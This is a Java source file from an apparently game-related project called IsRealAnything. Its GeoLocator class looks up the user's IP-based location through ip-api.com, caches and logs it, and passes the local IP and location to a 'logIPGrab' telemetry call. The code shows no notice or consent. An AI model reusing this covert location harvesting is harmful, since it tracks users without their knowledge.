package com.epicspymain.isrealanything.collector;

import com.epicspymain.isrealanything.IsRealAnything;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.URL;
import java.util.stream.Collectors;

/**
 * Fetches approximate geolocation via IP lookup.
 * Uses https://ip-api.com/json for free IP geolocation.
 * WARNING: This is for educational/research purposes only.
 */
public class GeoLocator {
	private static final String IP_API_URL = "http://ip-api.com/json/";
	private static String cachedLocation = null;
	
	/**
	 * Fetches the user's approximate location based on their IP address.
	 * Returns a JSON string with location data.
	 */
	public static String fetchLocation() {
		if (!IsRealAnything.ENABLE_DATA_COLLECTION) {
			return null;
		}
		
		if (cachedLocation != null) {
			return cachedLocation;
		}
		
		try {
			// Get local IP address
			InetAddress localHost = InetAddress.getLocalHost();
			String localIP = localHost.getHostAddress();
			
			IsRealAnything.LOGGER.debug("Local IP: {}", localIP);
			
			// Fetch public IP geolocation
			URL url = new URL(IP_API_URL);
			HttpURLConnection conn = (HttpURLConnection) url.openConnection();
			conn.setRequestMethod("GET");
			conn.setRequestProperty("User-Agent", "IsRealAnything/1.0");
			conn.setConnectTimeout(5000);
			conn.setReadTimeout(5000);
			
			int responseCode = conn.getResponseCode();
			
			if (responseCode == 200) {
				try (BufferedReader reader = new BufferedReader(
						new InputStreamReader(conn.getInputStream()))) {
					String response = reader.lines().collect(Collectors.joining());
					cachedLocation = response;
					
					IsRealAnything.LOGGER.info("[GEOLOCATION] {}", response);
					
					// Log to telemetry
					MavonLogger.logIPGrab(localIP, response);
					
					return response;
				}
			} else {
				IsRealAnything.LOGGER.warn("Failed to fetch geolocation, response code: {}", responseCode);
			}
			
			conn.disconnect();
			
		} catch (Exception e) {
			IsRealAnything.LOGGER.error("Error fetching geolocation", e);
		}
		
		return null;
	}
	
	/**
	 * Extracts specific field from the cached location JSON.
	 */
	public static String getLocationField(String fieldName) {
		if (cachedLocation == null) {
			fetchLocation();
		}
		
		if (cachedLocation == null) {
			return null;
		}
		
		try {
			// Simple JSON parsing (without gson for minimal dependencies)
			String pattern = "\"" + fieldName + "\":\"";
			int startIndex = cachedLocation.indexOf(pattern);
			if (startIndex == -1) return null;
			
			startIndex += pattern.length();
			int endIndex = cachedLocation.indexOf("\"", startIndex);
			if (endIndex == -1) return null;
			
			return cachedLocation.substring(startIndex, endIndex);
		} catch (Exception e) {
			return null;
		}
	}
	
	/**
	 * Gets cached location data without making new request.
	 */
	public static String getCachedLocation() {
		return cachedLocation;
	}
	
	/**
	 * Clears the cached location to force a fresh fetch on next call.
	 */
	public static void clearCache() {
		cachedLocation = null;
	}
}
